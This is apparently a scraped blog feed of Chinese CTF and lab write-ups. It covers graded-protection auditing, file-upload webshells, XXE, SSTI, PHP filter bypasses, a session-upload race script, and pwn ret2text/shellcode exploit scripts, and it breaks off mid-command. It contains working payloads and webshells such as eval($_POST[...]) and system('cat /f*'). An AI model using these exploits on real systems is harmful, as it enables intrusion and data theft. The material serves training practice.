0.0.0.0:8899 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:8848 0.0.0.0:* LISTEN\rtcp6 0 0 :::3306 :::* LISTEN\rtcp6 0 0 ::1:6379 :::* LISTEN\rtcp6 0 0 :::33060 :::* LISTEN\rtcp6 0 0 :::22 :::* LISTEN\rtcp6 0 0 :::8848 :::* LISTEN\rudp 0 0 127.0.0.53:53 0.0.0.0:*\rudp 0 0 10.0.10.1:68 0.0.0.0:* 进入服务器中的小皮面板看看呢\n在站点发现可疑目录，并且对应的就是5566这个端口\n在目录中发现这个木马\n答案：flag{5566}\n步骤十一 #\r11.已知相应的WEB恶意端口，提交其隐藏文件中flag\n在上图中的hacker.php中有\n\u0026lt;?php eval($_POST[\u0026#39;7815696ecbf1c96e6894b779456d330e\u0026#39;]); ?\u0026gt; 答案：flag{7815696ecbf1c96e6894b779456d330e}\n步骤十二 #\r12.结合相关知识，提交MySQL存在空口令风险的用户名，多个用户名已+连接\n我这里使用的是数据库连接工具datagrip，可以直接打开mysql数据库中的user表，查看authentication字段为空的用户即可，或者使用以下命令\nselect User,authentication_string from mysql.user; 可以看到yunwei是没有密码的\n答案：flag{yunwei}\n步骤十三 #\r13.结合相关知识，对MySQL密码复杂度查询到的最小长度进行提交\nSHOW VARIABLES LIKE \u0026#39;validate_password%\u0026#39;;\r#查到validate_password.length的值为8 答案：flag{8}\n步骤十四 #\r14.结合相关知识，对MySQL登录最大失败次数查询并提交\nshow variables like \u0026#39;%connection_control%\u0026#39;;\r#connection_control_failed_connections_threshold 3 答案：flag{3}\n步骤十五 #\r15.结合相关知识，对MySQL超时返回最大时常进行提交(秒为单位)\nSHOW VARIABLES LIKE \u0026#39;wait_timeout\u0026#39;; #28800 答案：flag{28800}\n步骤十六 #\r16.结合相关知识，对MySQL锁定用户数量进行提交\nSELECT COUNT(*) FROM mysql.user WHERE account_locked = \u0026#39;Y\u0026#39;; # 3 答案：flag{3}\n步骤十七 #\r17.提交MySQL全局日志状态 OFF或ON\nSHOW VARIABLES LIKE \u0026#39;general_log\u0026#39;; # OFF 答案：flag{OFF}\n步骤十八 #\r18.提交当前MySQL数据库版本\nselect version(); #8.0.27 答案：flag{8.0.27}\n步骤十九 #\r19.使用/root/fscan/fscan对本地进行扫描，对存在漏洞的端口进行提交，多个端口以+连接\n123456是redis的弱密码\n答案：flag{6379+8848}\n步骤二十 #\r20.根据找到其中的一个应用服务漏洞，提交数据中的flag\n上一个步骤里的8848端口存在nacos权限绕过\n抓到登陆包，修改如图，可以创建用户\n在后台拿到flag\n答案：flag{636ce4dc544036142a8e05a686b5c27e}\n步骤二十一 #\r20.根据搭建服务端口12345进行渗透测试，提交命令执行的whoami回显包\n网站应该还是用thinkphp搭建的\n这里可以使用现成的框架工具来渗透，不过没有能直接执行命令的poc\n来到后台添加文章，每个点都尝试一下\n\u003c?php system(whoami);?\u003e转义后替换到info里，发包就行\r最后访问文章，把文章后缀的html改为php，即可得到权限为www\n答案：flag{www}\n","date":"2024-07-06","externalUrl":null,"permalink":"/posts/2024/07/linux-graded-protection-assessment/","section":"Posts","summary":"","title":"等保-Linux等保测评","type":"posts"},{"content":"","date":"2024-07-06","externalUrl":null,"permalink":"/tags/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84/","section":"Tags","summary":"","title":"等保测评","type":"tags"},{"content":"","date":"2024-06-15","externalUrl":null,"permalink":"/categories/vulnerability-review/","section":"Categories","summary":"","title":"Vulnerability-Review","type":"categories"},{"content":"环境：极核::CTF (get-shell.com)\n进入平台主页，点击免费使用，注册账号，登入后台\n在左侧的广告设置一栏中，存在图片上传的点\n这里可以先随意上传一个图片（要先打开burp suite的拦截，在点击上传\n可以看到拦截下来的包是这样的，图片是内容进行了base64加解密处理\n把一句话木马进行base64加密，并且替换掉原来base64后面的一长串，修改文件类型为php\n转到repeater，发包，得到回显路径\n直接用蚁剑连接，拿到shell\n","date":"2024-06-15","externalUrl":null,"permalink":"/posts/2024/06/vulnerability-reproduction-dome-customer-service-platform/","section":"Posts","summary":"","title":"朵米客服平台","type":"posts"},{"content":"","date":"2024-06-15","externalUrl":null,"permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","section":"Tags","summary":"","title":"漏洞复现","type":"tags"},{"content":"","date":"2024-06-15","externalUrl":null,"permalink":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","section":"Tags","summary":"","title":"文件上传","type":"tags"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/categories/web-front-end/","section":"Categories","summary":"","title":"Web-Front-End","type":"categories"},{"content":"本站使用的星空背景特效是用html5 canvas绘制而成\n在Argon主题设置背景图片的代码里可以看到，背景图层的z-index是-2\n这里只需要添加一个canvas画布，把z-index抬高一点，即可覆盖\n打开wordpress控制台→主题文件编辑器→footer.php，找到如图所示位置\n添加代码如下所示\n\u0026lt;?php echo get_option(\u0026#39;argon_custom_html_foot\u0026#39;); ?\u0026gt;\r//从下面开始\r\u0026lt;canvas id=\u0026#34;canvas\u0026#34; style=\u0026#34;z-index: -1;left: 0;\rright: 0;\rtop: 0;\rbottom: 0;position: fixed;\u0026#34;\u0026gt;\r\u0026lt;/canvas\u0026gt;\r\u0026lt;script\u0026gt;\rvar canvas = document.getElementById(\u0026#39;canvas\u0026#39;),\rctx = canvas.getContext(\u0026#39;2d\u0026#39;),\rw = canvas.width = window.innerWidth,\rh = canvas.height = window.innerHeight,\rhue = 217,\rstars = [],\rcount = 0,\rmaxStars = 800; // 调整星星数量\rvar canvas2 = document.createElement(\u0026#39;canvas\u0026#39;),\rctx2 = canvas2.getContext(\u0026#39;2d\u0026#39;);\rcanvas2.width = 100;\rcanvas2.height = 100;\rvar half = canvas2.width / 2,\rgradient2 = ctx2.createRadialGradient(half, half, 0, half, half, half);\rgradient2.addColorStop(0.025, \u0026#39;#CCC\u0026#39;);\rgradient2.addColorStop(0.1, \u0026#39;hsl(\u0026#39; + hue + \u0026#39;, 61%, 33%)\u0026#39;);\rgradient2.addColorStop(0.25, \u0026#39;hsl(\u0026#39; + hue + \u0026#39;, 64%, 6%)\u0026#39;);\rgradient2.addColorStop(1, \u0026#39;transparent\u0026#39;);\rctx2.fillStyle = gradient2;\rctx2.beginPath();\rctx2.arc(half, half, half, 0, Math.PI * 2);\rctx2.fill();\rfunction random(min, max) {\rif (arguments.length \u0026lt; 2) {\rmax = min;\rmin = 0;\r}\rif (min \u0026gt; max) {\rvar hold = max;\rmax = min;\rmin = hold;\r}\rreturn Math.floor(Math.random() * (max - min + 1)) + min;\r}\rfunction maxOrbit(x, y) {\rvar max = Math.max(x, y),\rdiameter = Math.round(Math.sqrt(max * max + max * max));\rreturn diameter / 2;\r}\rvar Star = function() {\rthis.orbitRadius = random(maxOrbit(w, h));\rthis.radius = random(60, this.orbitRadius) / 8;\rthis.orbitX = w / 2;\rthis.orbitY = h / 2;\rthis.timePassed = random(0, maxStars);\rthis.speed = random(this.orbitRadius) / 300000;\rthis.alpha = random(2, 10) / 10;\rcount++;\rstars[count] = this;\r}\rStar.prototype.draw = function() {\rvar x = Math.sin(this.timePassed) * this.orbitRadius + this.orbitX,\ry = Math.cos(this.timePassed) * this.orbitRadius + this.orbitY,\rtwinkle = random(10);\rif (twinkle === 1 \u0026amp;\u0026amp; this.alpha \u0026gt; 0) {\rthis.alpha -= 0.05;\r} else if (twinkle === 2 \u0026amp;\u0026amp; this.alpha \u0026lt; 1) {\rthis.alpha += 0.05;\r}\rctx.globalAlpha = this.alpha;\rctx.drawImage(canvas2, x - this.radius / 2, y - this.radius / 2, this.radius, this.radius);\rthis.timePassed += this.speed;\r}\rfor (var i = 0; i \u0026lt; maxStars; i++) {\rnew Star();\r}\rfunction animation() {\rctx.globalCompositeOperation = \u0026#39;source-over\u0026#39;;\rctx.globalAlpha = 0.5; // 尾巴效果\rctx.fillStyle = \u0026#39;hsla(\u0026#39; + hue + \u0026#39;, 64%, 6%, 2)\u0026#39;;\rctx.fillRect(0, 0, w, h);\rctx.globalCompositeOperation = \u0026#39;lighter\u0026#39;;\rfor (var i = 1, l = stars.length; i \u0026lt; l; i++) {\rstars[i].draw();\r};\rwindow.requestAnimationFrame(animation);\r}\ranimation();\rwindow.addEventListener(\u0026#39;resize\u0026#39;, () =\u0026gt; {\rw = canvas.width = window.innerWidth;\rh = canvas.height = window.innerHeight;\rstars = [];\rcount = 0;\rfor (var i = 0; i \u0026lt; maxStars; i++) {\rnew Star();\r}\r});\r\u0026lt;/script\u0026gt;//到这里结束\r\u0026lt;/html\u0026gt; 因为这是h5的特性，一般来说只要不是老旧的浏览器，都能正常显示出canvas\n会造成很小性能损失\n","date":"2024-06-02","externalUrl":null,"permalink":"/posts/2024/06/background-starry-sky-visual-effects/","section":"Posts","summary":"","title":"背景星空特效","type":"posts"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/tags/%E5%89%8D%E7%AB%AF/","section":"Tags","summary":"","title":"前端","type":"tags"},{"content":"\rWEB #\rexx #\r这个标题以及整个界面，在NSS里面是做到过原题的，整体思路就是XXE\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt;\r\u0026lt;!DOCTYPE note [\r\u0026lt;!ENTITY hyh SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt;\r]\u0026gt;\r\u0026lt;user\u0026gt;\r\u0026lt;username\u0026gt;\u0026amp;hyh;\u0026lt;/username\u0026gt;\r\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\r\u0026lt;/user\u0026gt; 然后发包即可\nSAS - Serializing Authentication System #\rbase64加密之后传入参数即可\n\u0026lt;?php\rclass User {\rpublic $username;\rpublic $password;\rfunction __construct($username, $password) {\r$this-\u0026gt;username = $username;\r$this-\u0026gt;password = $password;\r}\rfunction isValid() { return $this-\u0026gt;username === \u0026#39;admin\u0026#39; \u0026amp;\u0026amp; $this-\u0026gt;password === \u0026#39;secure_password\u0026#39;; }\r}\r$a=new User(\u0026#39;admin\u0026#39;,\u0026#39;secure_password\u0026#39;);\recho base64_encode(serialize($a)); 一个\u0026hellip;.池子？ #\r能够回显2\n可以看出考察SSTI模板注入\n{{lipsum.__globals__.__getitem__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /f*\u0026#39;).read()}} #直接打通 浏览器也能套娃？ #\r这道题虽然存在XSS漏洞，但是考点是SSRF服务端请求伪造\n使用协议绕过\nfile:///flag.txt 高亮主题(划掉)背景查看器 #\r一眼文件包含，不过需要抓包\n百万美元的诱惑 #\r\u0026lt;?php\rerror_reporting(0);\r$a = $_GET[\u0026#39;a\u0026#39;];\r$b = $_GET[\u0026#39;b\u0026#39;];\r$c = $_GET[\u0026#39;c\u0026#39;];\rif ($a !== $b \u0026amp;\u0026amp; md5($a) == md5($b)) {\rif (!is_numeric($c) \u0026amp;\u0026amp; $c \u0026gt; 2024) {\recho \u0026#34;好康的\u0026#34;;\r} else {\rdie(\u0026#34;干巴爹干巴爹先辈~\u0026#34;);\r}\r}\relse {\rdie(\u0026#34;开胃小菜))\u0026#34;);\r}\r开胃小菜)) #?a[]=1\u0026amp;b[]=2\u0026amp;c=9999%20 绕过得到./dollar.php\n//dollar.php\r\u0026lt;?php\r//flag in 12.php\rerror_reporting(0);\rif(isset($_GET[\u0026#39;x\u0026#39;])){\r$x = $_GET[\u0026#39;x\u0026#39;];\rif(!preg_match(\u0026#34;/[a-z0-9;`|#\u0026#39;\\\u0026#34;%\u0026amp;\\x09\\x0a\u0026gt;\u0026lt;.,?*\\-=\\\\[\\]]/i\u0026#34;, $x)){\rsystem(\u0026#34;cat \u0026#34;.$x.\u0026#34;.php\u0026#34;);\r}\r}else{\rhighlight_file(__FILE__);\r}\r?\u0026gt; 上面的正则表达式过滤了以下几种情况\n小写字母 a 到 z（忽略大小写，使用 i 修饰符）\n数字 0 到 9\n特殊字符：;、\\``、|、#、\u0026rsquo;、\u0026quot;、%、\u0026amp;、\\x09（制表符）、\\x0a（换行符）、\u0026gt;、\u0026lt;、.、，、?、*、-、=、[、]`\n这里只需要构造出1、2两个数字即可，用了一种很新的思路\n即可以使用$、（、），~这四个字符进行构造\n// x=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) ","date":"2024-06-01","externalUrl":null,"permalink":"/posts/2024/06/litctf-2024/","section":"Posts","summary":"","title":"LitCTF 2024","type":"posts"},{"content":"前言 ：练习题目，康复训练\n原谅4 #\r\u0026lt;?php isset($_GET[\u0026#39;xbx\u0026#39;])?system($_GET[\u0026#39;xbx\u0026#39;]):highlight_file(__FILE__); 题目给了这一段代码，但是经过测试，只有ls、rm、sh这三个命令能用\nflag在根目录，没有直接读取文件的命令\n但是这个sh命令是可以执行文件中的命令的，类似于下图\n当文件中的命令不能被正常执行时候，会抛出command not found的错误\n可以使用linux中的重定向错误输出，具体可见下文\n一篇文章看懂linux的2\u0026gt;$1-CSDN博客 重定向之后，错误输出就变成了标准输出，浏览器可以正常显示，于是预期解如下\n由于只是限制了/bin目录下的二进制文件，但是在其他目录下还可能存在其他的命令文件，就存在了非预期，比如说在/usr/local/bin下存在php文件，可以用这个\n尝试直接包含/flag\n原谅5_fastapi2 #\rfastapi存在一个docs接口可以进行交互操作\n题目给出提示过滤\n[\u0026#39;import\u0026#39;, \u0026#39;open\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;class\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;vars\u0026#39;, \u0026#39;str\u0026#39;, \u0026#39;chr\u0026#39;] 使用list查看calc的全局变量如下\n在youdontknow里面存在有过滤的单词和字符\n这里可以尝试消去youdontknow里的所有属性\n传入youdontknow.clear()命令之后，再进行list查看全局变量，可以发现waf被覆盖了\n最后使用open read文件操作读取根目录下的flag\n原谅6_web3 #\r\u0026lt;?php\rerror_reporting(0);\rhighlight_file(__FILE__);\rinclude(\u0026#39;waf.php\u0026#39;);\r$file = $_GET[\u0026#39;file\u0026#39;] ?? NULL;\r$content = $_POST[\u0026#39;content\u0026#39;] ?? NULL;\r(waf_file($file)\u0026amp;\u0026amp;waf_content($content))?(file_put_contents($file,$content)):NULL; 对于输入的文件参数有过滤，这道题考察的是修改.user.ini来进行session文件包含\n但是默认uploadclearup是on，那么上传之后就会立即清空，不过存在条件竞争可能性\n利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户 根据上文中的脚本进行简单修改\nimport io\rimport requests\rimport threading\rsessid = \u0026#39;hyh\u0026#39;\rurl=\u0026#39;http://518a31e6-f1c8-4991-ab71-8a1573952207.challenge.ctf.show/\u0026#39;\rdef write(session):\rwhile True:\rf = io.BytesIO(b\u0026#39;a\u0026#39; * 1024 * 50)\rresp = session.post( url, data={\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#34;\u0026lt;?php system(\u0026#39;cat ./flag.php\u0026#39;);?\u0026gt;\u0026#34;}, files={\u0026#39;file\u0026#39;: (\u0026#39;hyh.txt\u0026#39;,f)}, cookies={\u0026#39;PHPSESSID\u0026#39;: sessid} )\rdef read(session):\rwhile True:\rresp = session.get(url + \u0026#34;index.php\u0026#34;)\rif \u0026#34;upload_progress\u0026#34; in resp.text:\rprint(resp.text)\rif __name__==\u0026#34;__main__\u0026#34;:\revent=threading.Event()\rwith requests.session() as session:\rhyh={\r\u0026#34;content\u0026#34;: \u0026#34;auto_prepend_file=/tmp/sess_\u0026#34; + sessid\r}//先写入.user.ini文件\rsession.post(url + \u0026#34;?file=.user.ini\u0026#34;, data=hyh)\rfor i in range(1,30):\rthreading.Thread(target=write,args=(session,)).start()\rfor i in range(1,30):\rthreading.Thread(target=read,args=(session,)).start()\revent.set() 自动包含sess文件之后会对所有文件生效,同时再访问index.php或者waf.php即可看到被包含的flag\nfastapi2 for 阿狸 #\r过滤名单['import', 'open', 'eval', 'exec', 'class', '\\'', '\u0026quot;', 'vars', 'str', 'chr', '%', '_', 'flag','in', '-', 'mro', '[', ']']\n额没什么好说的,跟上面那个一样\n","date":"2024-03-23","externalUrl":null,"permalink":"/posts/2024/03/ctfshow-forgive-cup/","section":"Posts","summary":"","title":"CTFshow-原谅杯","type":"posts"},{"content":"","date":"2023-12-05","externalUrl":null,"permalink":"/categories/pwn/","section":"Categories","summary":"","title":"Pwn","type":"categories"},{"content":"题目来源于NSSCTF网站\nret2text #\r[SWPUCTF 2021 新生赛]gift_pwn #\r先放到虚拟机里checksec一下，能看到开启NX，没有PIE，64位\n放进64位的IDA反编译一下，可以看到在gift函数里留了后门\n然后再vuln函数里有read函数，存在溢出\nret2text的基本做法就是让读入的buf溢出到system/bin/sh的地址\n这里对于buf的长度，有两种判断方式，要么直接看IDA反编译的结果（这个有可能不准），要么就进入动态调试查看\n这里先将read函数的地址复制下来在虚拟机的pwndbg里进行断点调试\n计算RAX和RBP的差值，即为数组的实际长度\nprint(0x7fffffffe380-0x7fffffffe370)\r#16 那么ret2text的基本框架就是这样👇\nfrom pwn import *\rio = remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;,28980)\rtarget=0x00000000004005C4 #system/bin/sh的地址\rpayload=b\u0026#39;a\u0026#39;*(16+8)+p64(target) #栈溢出\r#如果是32位指针大小就是4，如果是64位指针大小就是8\rio.send(payload)\rio.interactive() [BJDCTF 2020]babystack2.0 #\r先check一下，用IDA64位打开\n先看main函数源码\n可以得出，先要输名字的长度，然后再read，buf是12位，也可以进行调试算（我这题调不出来，可以直接用IDA给的数据\n由于有两个输入点，一个是scanf，另一个是read，scanf这个点可以随便填，重点在于read部分的溢出\nbuf的数组长度应该是由注释部分来计算得到0x10\n那么还是套基本框架写脚本\nfrom pwn import *\rio = remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;,28559)\rtarget=0x040072A #system/bin/sh的地址\rpayload=b\u0026#39;a\u0026#39;*(24)+p64(target) #栈溢出\rio.sendlineafter(\u0026#39;name:\u0026#39;,b\u0026#39;-1\u0026#39;)\rio.sendafter(\u0026#39;name?\u0026#39;,payload)\rio.interactive() 对于read函数来说是不需要用sendline的，sendline会在末尾加一个换行符，也就是回车，scanf是必须要回车结尾的。\n[NISACTF 2022]ezstack #\r用32位IDA打开\n可以看到在shell函数里存在溢出\n这里没有直接可以使用是system/bin/sh\n不过经过查找在plt连接表段里有system的地址，在data段里有/bin/sh的字符串可以凑成命令\n这道题有点libc的感觉\n先溢出，然后到system的连接地址，然后补充4个单位的垃圾数据，最后是/bin/sh的命令字符串\n当程序调用system函数时，会自动去寻找栈底即ebp指向的位置，然后将ebp+8字节的位置的数据当作函数的参数，所以如果我们想将/bin/sh作为system函数的参数，就可以在栈溢出的时候，先修改eip为system函数的地址，然后填充4个字节的垃圾数据，再将/bin/sh的地址写入栈上，这样调用system函数的时候，就可以将/bin/sh作为参数，然后返回一个shell。(这是为什么要在systemaddr后面补4个字节的原因\n具体可查：PWN疑难（1-3）-关于payload中栈的布置以及system的一些困惑 (yuque.com)\nfrom pwn import *\rio = remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;,28088)\rsystem_addr=0x08048390\rbinsh_addr=0x0804A024\rpayload=b\u0026#39;a\u0026#39;*(0x48+4)+p32(system_addr)+b\u0026#39;a\u0026#39;*4+p32(binsh_addr)\rio.send(payload)\rio.interactive() [NISACTF 2022]ezpie #\r先checksec，32位，开启了pie保护，这就造成了地址的随机化，但是地址的相对位移的不变的\n使用readelf工具查看地址\n可以看到main函数和shell函数的地址\n那么可以这样写脚本👇\nfrom pwn import *\rio = remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;,28902)\rmain_addr=0x00000770\rshell_addr=0x0000080f\roffset=shell_addr-main_addr #计算偏移量\rmain_real_addr=int(io.recvuntil(\u0026#39;70\u0026#39;)[-10:].decode(),16)#根据IDA源码可知\rshell_real_addr=main_real_addr+offset #拼接出真实的shell地址\rpayload=b\u0026#39;a\u0026#39;*(0x28+4)+p32(shell_real_addr) #溢出即可\rio.send(payload)\rio.interactive() 极客大挑战2023 ret2text #\r可以看到开启了PIE保护，导致地址随机化\n在backdoor里发现后门函数\n由于PIE特性，只有最后两个字节会不同，只需要覆盖最后两个字节到backdoor即可，又因为地址是随机化的，只能概率性获得shell\n脚本如下👇\nfrom pwn import *\rio=process(\u0026#34;./ret2text\u0026#34;)\rbackdoor=0x1227 #后门地址\rpayload=b\u0026#39;a\u0026#39;*88+p16(backdoor) #只需要覆盖两个字节即可\rwhile True:\rio.send(payload)\rio.interactive() ret2shellcode #\r[HNCTF 2022 Week1]ret2shellcode #\r先进行check\n在IDA中看到main函数\n源码中并不存在/bin/sh的地址，不过buff处于bss段是可写的\n在read函数的call部分打个断点，用vmmap查看\n发现地址为0x404000到0x405000的地址段是可读写可执行的\n那么就要尝试发送shellcode到buff段，然后溢出到buff的地址（就这道题而言\n编写脚本👇\nfrom pwn import *\rcontext(log_level = \u0026#34;debug\u0026#34;, arch = \u0026#39;amd64\u0026#39;)\rio=remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;, 28167)\rbuff_addr = 0x4040A0\rshellcode = asm(shellcraft.sh())\rpayload = shellcode.ljust(0x100+8, b\u0026#39;a\u0026#39;) + p64(buff_addr)\rio.sendline(payload)\rio.interactive() 其中使用了系统自带的shellcraft，一定要设置context，不然就会无回显或者报错，建议类似的shellcode都要加context\n[HNCTF 2022 Week1]ezr0p32 #\rcheck一下\n主要的函数内容\n经过简单分析，可以看到plt段存有system的地址，\n而且在bss段也有可写入的buf区间\n这道题的步骤就是在第一个read函数处写入/bin/sh，然后在第二个read读取是时候溢出到plt的system地址，然后拿到shell\n编写脚本👇\nfrom pwn import *\rio=remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;,28772)\rsystem_addr=0x080483D0\rbss_addr=0x804a080\rpayload=\u0026#39;/bin/sh\u0026#39;\rio.sendafter(\u0026#39;please tell me your name\\n\u0026#39;,payload)\rpayload=b\u0026#39;a\u0026#39;*(28+4)+p32(system_addr)+p32(0)+p32(bss_addr)\rio.sendafter(\u0026#34;now it\u0026#39;s your play time~\\n\u0026#34;,payload)\rio.interactive() [HNCTF 2022 Week1]safe_shellcode #\r源码是这样的👇\n其中对输入的s有ascii值的判断，大概就是必须是可见字符，不然就exit\n然后把s推到buff里，执行buff\n编写脚本👇\nfrom pwn import *\rio=remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;,28428)\rcontext(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;)\rshellcode=\u0026#39;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00gao@fossa\u0026#39;\rio.send(shellcode)\rio.interactive() ","date":"2023-12-05","externalUrl":null,"permalink":"/posts/2023/12/pwn-practice/","section":"Posts","summary":"","title":"Pwn练习题","type":"posts"},{"content":"\r前言 #\r本校的极客大挑战还是要参加的，去年就很遗憾，今年得好好打一下，这次我会把能写的全写在博客里，同时也会学习一下其他的方向\n组队的队友是外校大三的网工学长，很强的选手！\n题目没有分week，这里我就分类，按照时间题目发布时间/做出来的顺序来写了\n以校外赛道21名的成绩结束比赛，学到了很多东西！\nWEB #\rEzHttp #\rhttp签到，点击就送flag http://1.117.175.65:23333/\n第一关：请post传参username和password进行登录\n账号密码在\n第二关：必须来源自sycsec.com 👉添加referer头\n第三关：请使用Syclover浏览器 👉修改user-agent头\n第四关：请从localhost访问 👉经典的XFF头绕过\n第五关：请使用Syc.vip代理 👉添加Via头\n然后跳转到一个页面\n\u0026lt;?php\rif($_SERVER[\u0026#39;HTTP_O2TAKUXX\u0026#39;]==\u0026#34;GiveMeFlag\u0026#34;){\recho $flag;\r}\r?\u0026gt; 这段代码的意思是又要一个http头名为O2TAKUXX，值为GiveMeFlag\n最终如图👇\nunsign #\r一道反序列化题，代码如下\n\u0026lt;?php\rhighlight_file(__FILE__);\rclass syc\r{\rpublic $cuit;\rpublic function __destruct()\r{\recho(\u0026#34;action!\u0026lt;br\u0026gt;\u0026#34;);\r$function=$this-\u0026gt;cuit;\rreturn $function();\r}\r}\rclass lover\r{\rpublic $yxx;\rpublic $QW;\rpublic function __invoke()\r{\recho(\u0026#34;invoke!\u0026lt;br\u0026gt;\u0026#34;);\rreturn $this-\u0026gt;yxx-\u0026gt;QW;\r}\r}\rclass web\r{\rpublic $eva1;\rpublic $interesting;\rpublic function __get($var)\r{\recho(\u0026#34;get!\u0026lt;br\u0026gt;\u0026#34;);\r$eva1=$this-\u0026gt;eva1;\r$eva1($this-\u0026gt;interesting);\r}\r}\rif (isset($_POST[\u0026#39;url\u0026#39;])) {\runserialize($_POST[\u0026#39;url\u0026#39;]);\r}\r?\u0026gt; pop链从上往下很明显了：destruct👉invoke👉get\n\u0026lt;?\rclass syc\r{\rpublic $cuit;\r}\rclass lover\r{\rpublic $yxx;\rpublic $QW;\r}\rclass web\r{\rpublic $eva1=\u0026#39;system\u0026#39;;\rpublic $interesting=\u0026#39;cat /f*\u0026#39;;\r}\r$syc=new syc();\r$lover=new lover();\r$web=new web();\r$syc-\u0026gt;cuit=$lover;\r$lover-\u0026gt;yxx=$web;\recho serialize($syc);\r#O:3:\u0026#34;syc\u0026#34;:1:{s:4:\u0026#34;cuit\u0026#34;;O:5:\u0026#34;lover\u0026#34;:2:{s:3:\u0026#34;yxx\u0026#34;;O:3:\u0026#34;web\u0026#34;:2:{s:4:\u0026#34;eva1\u0026#34;;s:6:\u0026#34;system\u0026#34;;s:11:\u0026#34;interesting\u0026#34;;s:7:\u0026#34;cat /f*\u0026#34;;}s:2:\u0026#34;QW\u0026#34;;N;}} n00b_Upload #\r比较简单的文件上传，直接上图👇\n在右边有对应的检测项，我这里是前面加了部分图片的内容，末尾加了php的短代码，这里直接使用php会被检测到，文件类型也要改，然后就能命令执行了\neasy_php #\r学了php了，那就来看看这些绕过吧\n\u0026lt;?php\rheader(\u0026#39;Content-type:text/html;charset=utf-8\u0026#39;);\rerror_reporting(0);\rhighlight_file(__FILE__);\rinclude_once(\u0026#39;flag.php\u0026#39;);\rif(isset($_GET[\u0026#39;syc\u0026#39;])\u0026amp;\u0026amp;preg_match(\u0026#39;/^Welcome to GEEK 2023!$/i\u0026#39;, $_GET[\u0026#39;syc\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;syc\u0026#39;] !== \u0026#39;Welcome to GEEK 2023!\u0026#39;) {\rif (intval($_GET[\u0026#39;lover\u0026#39;]) \u0026lt; 2023 \u0026amp;\u0026amp; intval($_GET[\u0026#39;lover\u0026#39;] + 1) \u0026gt; 2024) {\rif (isset($_POST[\u0026#39;qw\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;yxx\u0026#39;]) {\r$array1 = (string)$_POST[\u0026#39;qw\u0026#39;];\r$array2 = (string)$_POST[\u0026#39;yxx\u0026#39;];\rif (sha1($array1) === sha1($array2)) {\rif (isset($_POST[\u0026#39;SYC_GEEK.2023\u0026#39;])\u0026amp;\u0026amp;($_POST[\u0026#39;SYC_GEEK.2023\u0026#39;]=\u0026#34;Happy to see you!\u0026#34;)) {\recho $flag;\r} else {\recho \u0026#34;再绕最后一步吧\u0026#34;;\r}\r} else {\recho \u0026#34;好哩，快拿到flag啦\u0026#34;;\r}\r} else {\recho \u0026#34;这里绕不过去，QW可不答应了哈\u0026#34;;\r}\r} else {\recho \u0026#34;嘿嘿嘿，你别急啊\u0026#34;;\r}\r}else {\recho \u0026#34;不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！\u0026#34;;\r}\r?\u0026gt; 第一层：正则匹配，这里的preg_match函数采用的匹配方式是从头到尾/^abc$/这样的形式，只需要在字符串的最后添加%0a换行符即可绕过\n第二层：intval，科学计数法即可绕过，2022e2\n第三层：string化的sha1比较，这里只需把参数都以数组形式传进去，经过string强转后值都变成了Array\n第四层：SYC_GEEK.2023这个字符串存在一个下划线，而下划线被当作参数传进去后会被PHP转为一个点，不过当左括号 [ 被当作参数传入的时候，会被转为下划线，这里只需要修改其中的下划线为左括号即可。当前前面已经有PHP特殊字符转换的时候，后续的就会被忽略，GEEK和2023的中的点就不用管了\nctf_curl #\r命令执行？真的吗？\n\u0026lt;?php\rhighlight_file(\u0026#39;index.php\u0026#39;);\r// curl your domain\r// flag is in /tmp/Syclover\rif (isset($_GET[\u0026#39;addr\u0026#39;])) {\r$address = $_GET[\u0026#39;addr\u0026#39;];\rif(!preg_match(\u0026#34;/;|f|:|\\||\\\u0026amp;|!|\u0026gt;|\u0026lt;|`|\\(|{|\\?|\\n|\\r/i\u0026#34;, $address)){\r$result = system(\u0026#34;curl \u0026#34;.$address.\u0026#34;\u0026gt; /dev/null\u0026#34;);\r} else {\recho \u0026#34;Hacker!!!\u0026#34;;\r}\r}\r?\u0026gt; 源码中给了提示了，curl你的域名，这道题需要一个服务器，然后再服务器下写一个php文件，然后在题目中curl自己服务器中的文件，使用-o 参数输出到题目靶机的目录下，然后跳转到其界面即可连接蚁剑或者直接手打\nklf_ssti #\r页面源码中给了一个/hack路由，klf是参数，但初步测试没有效果\n这里推荐一个SSTImap工具，十分强大，还能直接模拟shell连接\nGitHub - vladko312/SSTImap: Automatic SSTI detection tool with interactive interface\nD:\\SSTImap-master\u0026gt;python sstimap.py -u 